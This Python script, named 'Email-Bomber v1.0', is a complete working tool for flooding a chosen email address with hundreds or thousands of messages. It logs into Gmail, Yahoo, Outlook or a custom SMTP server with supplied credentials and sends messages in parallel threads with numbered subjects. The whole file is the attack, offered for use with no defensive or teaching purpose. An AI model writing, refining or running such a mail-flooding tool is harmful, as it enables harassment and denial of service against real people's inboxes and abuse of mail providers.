import smtplib
import time
import os
import sys
from email.utils import formataddr
import threading


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

def banner():
    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(bcolors.GREEN + '+[+[+[ made with codes ]+]+]+')
    print(bcolors.GREEN + """   
██╗  ██╗    █████╗       █████╗     ███████╗     ████╗      ███╗   ██╗
██║ ██╔╝    ██╔══██╗    ██╔══██╗    ██╔════╝   ██╔═══██╗    ████╗  ██║
█████╔╝     ██████╔╝    ███████║    █████╗     ██║   ██║    ██╔██╗ ██║
██╔═██╗     ██╔══██╗    ██╔══██║    ██╔══╝     ██║   ██║    ██║╚██╗██║
██║  ██╗    ██║  ██║    ██║  ██║    ███████╗   ██╔═══██╗    ██║ ╚████║
╚═╝  ╚═╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝    ╚══════╝     █████╔╝    ╚═╝  ╚═══╝
 """)






def progress_bar(current, total, bar_length=20):
    progress = float(current) / float(total)
    block = int(round(bar_length * progress))
    text = "\rLoading: [{0}{1}] {2:.2f}%".format(">" * block, "-" * (bar_length - block), progress * 100)
    sys.stdout.write(text)
    sys.stdout.flush()

class EmailBomber:
    def __init__(self):
        self.target = input('\nEnter target email: ')
        self.mode = int(input('\nEnter BOMB mode [1, 2, 3, 4]:\n1: 1000\n2: 500\n3: 250\n4: Custom\n'))

        if self.mode not in range(1, 5):
            print('ERROR: Invalid Option. Goodbye.')
            exit(1)

        self.amount = 0
        if self.mode == 1:
            self.amount = 1000
        elif self.mode == 2:
            self.amount = 500
        elif self.mode == 3:
            self.amount = 250
        else:
            self.amount = int(input('\nChoose a CUSTOM amount: '))

        self.server = input('\nEnter email server:\n1: Gmail\n2: Yahoo\n3: Outlook\n')
        if self.server == '1':
            self.server = 'smtp.gmail.com'
            self.port = 587
        elif self.server == '2':
            self.server = 'smtp.mail.yahoo.com'
            self.port = 587
        elif self.server == '3':
            self.server = 'smtp-mail.outlook.com'
            self.port = 587
        else:
            self.server = input('Enter server name: ')
            self.port = int(input('Enter port number: '))

        self.from_addr = input('\nEnter from address: ')
        self.from_pwd = input('\nEnter from password: ')
        self.subject = input('\nEnter subject: ')
        self.sender_name = input("\nEnter sender's name: ")

        def get_message_file():
            if getattr(sys, 'frozen', False):
                application_path = os.path.dirname(sys.executable)
            else:
                application_path = os.path.dirname(os.path.abspath(__file__))
            return os.path.join(application_path, 'message.txt')

        with open(get_message_file(), 'r', encoding='utf-8') as f:
            self.message = f.read()

    def send_email(self, index):
        try:
            with smtplib.SMTP(self.server, self.port) as s:
                s.starttls()
                s.login(self.from_addr, self.from_pwd)

                subject = f'{self.subject} ({index + 1})'
                msg = f'''From: {formataddr((self.sender_name, self.from_addr))}\nTo: {self.target}\nSubject: {subject}\n\n{self.message}\n'''
                s.sendmail(self.from_addr, self.target, msg.encode('utf-8'))
                progress_bar(index + 1, self.amount)
        except smtplib.SMTPException as e:
            print(f'BOMB failed: {e}')

    def attack(self):
        try:
            print('Initializing program...')

            
            num_threads = int(input('\nEnter the number of threads to use: '))
            sleep_time = float(input('\nEnter the sleep time between starting new threads (in seconds): '))

            print('\nSetting up bomb...\n')
            
            start_sending = input('\nDo you want to start sending emails? (Y/N): ')
            if start_sending != 'Y':
                print('Aborting the attack.')
                return
            
            threads = []

            for i in range(self.amount):
                if i % num_threads == 0 and i != 0:
                    for t in threads:
                        t.join()
                    threads.clear()

                t = threading.Thread(target=self.send_email, args=(i,))
                t.start()
                threads.append(t)
                time.sleep(sleep_time)

            for t in threads:
                t.join()

            print('\nAttack finished. DONE')
        except Exception as e:
            print(f'ERROR: {e}')
            exit(1)

if __name__ == '__main__':
    try:
        banner()
        bomb = EmailBomber()
        bomb.attack()
    except Exception as e:
        print(f"An error occurred: {e}")
        input("\nPress Enter to exit...")